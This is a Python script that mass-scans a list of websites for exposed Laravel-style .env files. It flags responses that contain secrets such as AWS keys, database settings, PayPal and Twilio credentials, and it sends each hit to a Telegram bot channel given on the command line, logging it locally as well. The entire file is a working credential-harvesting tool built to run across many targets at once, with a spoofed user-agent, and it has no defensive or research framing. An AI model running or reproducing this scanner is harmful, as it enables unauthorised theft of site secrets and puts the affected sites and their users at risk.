from urllib import request
import requests
import os
import sys
import concurrent.futures
import threading

red = '\033[31m'
green = '\033[32m'

teleapi = sys.argv[2]
telecnl = sys.argv[3]
Headers = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}
if not os.path.isdir('rzlt'):
    os.mkdir('rzlt')

def saverzlt(site):
    saverslt = "rzlt/" + sys.argv[1] + ".txt"
    with open(saverslt, 'a') as XW:
        XW.write('http://{}/.env \n'.format(site))
def SendTele(site):
    telegramapi = "https://api.telegram.org/bot" + teleapi + "/sendMessage?chat_id=@" + telecnl + "&text="
    requests.post(telegramapi+site, timeout=10, headers=Headers)

def checksitecode(site):
    checksite = "http://" + site + "/.env"
    mainreq = requests.get(checksite, timeout=20, headers=Headers)
    try:
        if 'APP_NAME=' in str(mainreq.content) or 'APP_KEY=' in str(mainreq.content) or 'PUSHER_APP_ID=' in str(mainreq.content) or 'AWS_BUCKET=' in str(mainreq.content) or 'DB_HOST=' in str(mainreq.content) or 'PAYPAL_' in str(mainreq.content) or 'AWS_ACCESS_KEY_ID=' in str(mainreq.content) or 'AWS_KEY=' in str(mainreq.content) or 'REDIS_' in str(mainreq.content) or 'DB_' in str(mainreq.content) or 'NEXMO_' in str(mainreq.content) or 'TWILIO_' in str(mainreq.content) or 'MAIL_HOST=' in str(mainreq.content):
            SendTele(checksite)
            print(green+" [*] " + site + "/.env")
            saverzlt(site)
        else:
            print(red+" [x] "+site)
    except:
        print(red+" [o] "+site)
if __name__ == '__main__':
    try:
        Target = "list/"+sys.argv[1]
        TEXTList = open(Target, 'r').read().splitlines()
        try:
            with concurrent.futures.ThreadPoolExecutor(400) as executor:
                executor.map(checksitecode, TEXTList)
        except Exception as e:
            print(e)
    except Exception as e:
        print(e)
